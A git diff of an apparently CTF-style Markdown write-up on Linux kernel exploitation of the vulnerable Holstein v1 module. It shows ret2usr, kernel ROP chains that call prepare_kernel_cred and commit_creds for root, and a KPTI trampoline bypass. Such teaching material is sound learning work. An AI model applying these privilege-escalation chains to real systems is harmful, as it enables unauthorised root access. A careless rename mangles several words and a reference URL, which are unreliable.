@@ -4,7 +4,7 @@
     - [prepare_kernel_cred and commit_creds](#prepare_kernel_cred-and-commit_creds)
     - [Return to userspace](#return-to-userspace)
 - [Exploit: ret2usr](#exploit-ret2usr-no-smep-no-smap-no-kpti-no-kaslr)
-- [Exploit: kROP](#exploit-krop-bypass-smep-smap-with-no-kpti-no-kaslr)
+- [Exploit: kROP](#exploit-kROP-bypass-smep-smap-with-no-kpti-no-kaslr)
 - [Exploit: KPTI](#exploit-kpti-with-smeps-smap-and-no-aslr)
     - [Bypass KPTI with Trampoline](#bypass-kpti-with-trampoline)
 - [References](#references)
@@ -163,21 +163,21 @@ qemu-system-x86_64 \
 
 Set a breapoint on `entry_SYSCALL_64` and `open` syscall:
 
-![alt text](./assets/image-2.png)
+![alt text](./ret2usr/assets/image-2.png)
 
 Continue execution and you will see the CPU privilege mode has been switched to kernel mode and stop at our breakpoint:
 
-![alt text](./assets/image-3.png)
+![alt text](./ret2usr/assets/image-3.png)
 
 First we still in the user space, so the `RSP` is pointing to the user stack, the `swapgs` instruction is used to switch the GS segment from the user GS to the kernel GS. So after this instruction, the `RSP` will point to the kernel stack. The `entry_SYSCALL_64` function will then save the user space registers and switch to kernel mode before going to `<do_syscall_64>` function.
 
-![alt text](./assets/image-4.png)
+![alt text](./ret2usr/assets/image-4.png)
 
 After implementing that syscall, the kernel will try to return to user space. There are two main instructions used for this purpose: `sysretq` and `iretq`. The `sysretq` instruction is used to return from a syscall, while the `iretq` instruction is used to return from an interrupt or exception. In the case of syscalls, the kernel will use `sysretq` to switch back to user mode and restore the user space registers. And there are also 2 functions that are used to return to user space: `syscall_return_via_sysret+` and `swapgs_restore_regs_and_return_to_usermode`. In this case, the kernel will use `syscall_return_via_sysret`.
 
-![alt text](./assets/image-5.png)
+![alt text](./ret2usr/assets/image-5.png)
 
-![alt text](./assets/image-6.png)
+![alt text](./ret2usr/assets/image-6.png)
 
 That's how the kernel switches from user space to kernel space and back to user space. But let's take a look at the disassembly of `syscall_return_via_sysret` and `swapgs_restore_regs_and_return_to_usermode`.
 
@@ -343,7 +343,7 @@ RFLAGS := (R11 & 3C7FD7H) | 2; (*
 
 ## Exploit: ret2usr (no SMEP, no SMAP, no KPTI, no KASLR)
 
-So let's back to our problem, in Holstein v1, the module have the overflow bug in `module_read` and `module_write` functions. So this make us easy to overwrite and control the saved RIP. And because no SMEP, no SMAP, no KPTI, and no KASLR, we can easily access/execute the userspace code from kernel space. You can see my exploit [here](./exploit.c). In the exploit, you can see that I have used the `prepare_kernel_cred` and `commit_creds` functions to change the credentials of the current process to `root`. And then call the `restore_state` function to return to user mode.
+So let's back to our problem, in Holstein v1, the module have the overflow bug in `module_read` and `module_write` functions. So this make us easy to overwrite and control the saved RIP. And because no SMEP, no SMAP, no KPTI, and no KASLR, we can easily access/execute the userspace code from kernel space. You can see my exploit [here](./ret2usr/exploit.c). In the exploit, you can see that I have used the `prepare_kernel_cred` and `commit_creds` functions to change the credentials of the current process to `root`. And then call the `restore_state` function to return to user mode.
 
 
 ## Exploit: kROP (bypass SMEP, SMAP with no KPTI, no KASLR)
@@ -362,40 +362,40 @@ Combine them together to create a ROP chain that will call `prepare_kernel_cred`
 
 ```c
     uint64_t idx = 0;
-    uint64_t *rop = (uint64_t *)(buf + 0x408);
+    uint64_t *ROP = (uint64_t *)(buf + 0x408);
 
-    rop[idx++] = pop_rdi; // return address
-    rop[idx++] = 0;
-    rop[idx++] = prepare_kernel_cred;
-    rop[idx++] = pop_rcx; // Set rcx to 0 to avoid "rep movsq qword ptr [rdi], qword ptr [rsi]" in mov_rdi_rax
-    rop[idx++] = 0;
-    rop[idx++] = mov_rdi_rax;
-    rop[idx++] = commit_creds;
-    rop[idx++] = swapgs; // Change Kernel segment GS -> User segment GS
-    rop[idx++] = iretq;
-    rop[idx++] = user_rip;
-    rop[idx++] = user_cs;
-    rop[idx++] = user_rflags;
-    rop[idx++] = user_rsp;
-    rop[idx++] = user_ss;
+    ROP[idx++] = pop_rdi; // return address
+    ROP[idx++] = 0;
+    ROP[idx++] = prepare_kernel_cred;
+    ROP[idx++] = pop_rcx; // Set rcx to 0 to avoid "rep movsq qword ptr [rdi], qword ptr [rsi]" in mov_rdi_rax
+    ROP[idx++] = 0;
+    ROP[idx++] = mov_rdi_rax;
+    ROP[idx++] = commit_creds;
+    ROP[idx++] = swapgs; // Change Kernel segment GS -> User segment GS
+    ROP[idx++] = iretq;
+    ROP[idx++] = user_rip;
+    ROP[idx++] = user_cs;
+    ROP[idx++] = user_rflags;
+    ROP[idx++] = user_rsp;
+    ROP[idx++] = user_ss;
 ```
 
-Here is my full [exploit code](./krop/exploit.c). However, you can make you ROp chain more short by passing `init_cred` to `commit_creds` instead of using `prepare_kernel_cred` (note that not all linux version build with `init_cred` symbol). So the ROP chain will look like this:
+Here is my full [exploit code](./kROP/exploit.c). However, you can make you ROP chain more short by passing `init_cred` to `commit_creds` instead of using `prepare_kernel_cred` (note that not all linux version build with `init_cred` symbol). So the ROP chain will look like this:
 
 ```c
     uint64_t idx = 0;
-    uint64_t *rop = (uint64_t *)(buf + 0x408);
+    uint64_t *ROP = (uint64_t *)(buf + 0x408);
 
-    rop[idx++] = pop_rdi; // return address
-    rop[idx++] = init_cred; // Pass init_cred to commit_creds
-    rop[idx++] = commit_creds;
-    rop[idx++] = swapgs; // Change Kernel segment GS -> User segment GS
-    rop[idx++] = iretq;
-    rop[idx++] = user_rip;
-    rop[idx++] = user_cs;
-    rop[idx++] = user_rflags;
-    rop[idx++] = user_rsp;
-    rop[idx++] = user_ss;
+    ROP[idx++] = pop_rdi; // return address
+    ROP[idx++] = init_cred; // Pass init_cred to commit_creds
+    ROP[idx++] = commit_creds;
+    ROP[idx++] = swapgs; // Change Kernel segment GS -> User segment GS
+    ROP[idx++] = iretq;
+    ROP[idx++] = user_rip;
+    ROP[idx++] = user_cs;
+    ROP[idx++] = user_rflags;
+    ROP[idx++] = user_rsp;
+    ROP[idx++] = user_ss;
 ```
 
 ## Exploit: Bypass KPTI (with SMEP, SMAP and no ASLR)
@@ -413,7 +413,7 @@ So when we run our ROP exploit above, it will `Segment fault`. This is because e
 
 ### Bypass KPTI with Trampoline
 
-The idea behind this technique is use the kernel's existing method of transitioning between userspace and kernelspace page tables in our exploit to transition gracefully to our drop_shell function. The function `swapgs_restore_regs_and_return_to_usermode` is used to move between these two pages and with an appropriate leak we can reuse this function in our rop chain. You can find the source code [here](https://github.com/torvalds/linux/blob/7587a4a5a4f66293e13358285bcbc90cc9bddb31/arch/x86/entry/entry_64.S#L575)
+The idea behind this technique is use the kernel's existing method of transitioning between userspace and kernelspace page tables in our exploit to transition gracefully to our dROP_shell function. The function `swapgs_restore_regs_and_return_to_usermode` is used to move between these two pages and with an appROPriate leak we can reuse this function in our ROP chain. You can find the source code [here](https://github.com/torvalds/linux/blob/7587a4a5a4f66293e13358285bcbc90cc9bddb31/arch/x86/entry/entry_64.S#L575)
 
 ```x86asm
 POP_REGS pop_rdi=0
@@ -470,23 +470,23 @@ The key point is that the stack was pre-adjusted to point to the correct locatio
     uint64_t mov_rdi_rax = 0xffffffff8160c96b;
 
     uint64_t idx = 0;
-    uint64_t *rop = (uint64_t *)(buf + 0x408);
+    uint64_t *ROP = (uint64_t *)(buf + 0x408);
 
-    rop[idx++] = pop_rdi; // return address
-    rop[idx++] = 0;
-    rop[idx++] = prepare_kernel_cred;
-    rop[idx++] = pop_rcx; // Set rcx to 0 to avoid "rep movsq qword ptr [rdi], qword ptr [rsi]" in mov_rdi_rax
-    rop[idx++] = 0;
-    rop[idx++] = mov_rdi_rax;
-    rop[idx++] = commit_creds;
-    rop[idx++] = kpti_trampoline_chain;
-    rop[idx++] = 0;           // [rdi+0x0]
-    rop[idx++] = 0;           // [rdi+0x8]
-    rop[idx++] = user_rip;    // [rdi+0x10]
-    rop[idx++] = user_cs;     // [rdi+0x18]
-    rop[idx++] = user_rflags; // [rdi+0x20]
-    rop[idx++] = user_rsp;    // [rdi+0x28]
-    rop[idx++] = user_ss;     // [rdi+0x30]
+    ROP[idx++] = pop_rdi; // return address
+    ROP[idx++] = 0;
+    ROP[idx++] = prepare_kernel_cred;
+    ROP[idx++] = pop_rcx; // Set rcx to 0 to avoid "rep movsq qword ptr [rdi], qword ptr [rsi]" in mov_rdi_rax
+    ROP[idx++] = 0;
+    ROP[idx++] = mov_rdi_rax;
+    ROP[idx++] = commit_creds;
+    ROP[idx++] = kpti_trampoline_chain;
+    ROP[idx++] = 0;           // [rdi+0x0]
+    ROP[idx++] = 0;           // [rdi+0x8]
+    ROP[idx++] = user_rip;    // [rdi+0x10]
+    ROP[idx++] = user_cs;     // [rdi+0x18]
+    ROP[idx++] = user_rflags; // [rdi+0x20]
+    ROP[idx++] = user_rsp;    // [rdi+0x28]
+    ROP[idx++] = user_ss;     // [rdi+0x30]
 ```
 
 Here is my full [exploit code](./kpti/exploit_kpti_trampoline.c) for this technique.
@@ -496,5 +496,5 @@ Here is my full [exploit code](./kpti/exploit_kpti_trampoline.c) for this techni
 - https://www.felixcloutier.com/x86/iret:iretd:iretq
 - https://www.felixcloutier.com/x86/sysret
 - https://blog.wohin.me/posts/linux-kernel-pwn-01/
-- https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/
+- https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ROPes/
 - https://breaking-bits.gitbook.io/breaking-bits/exploit-development/linux-kernel-exploit-development
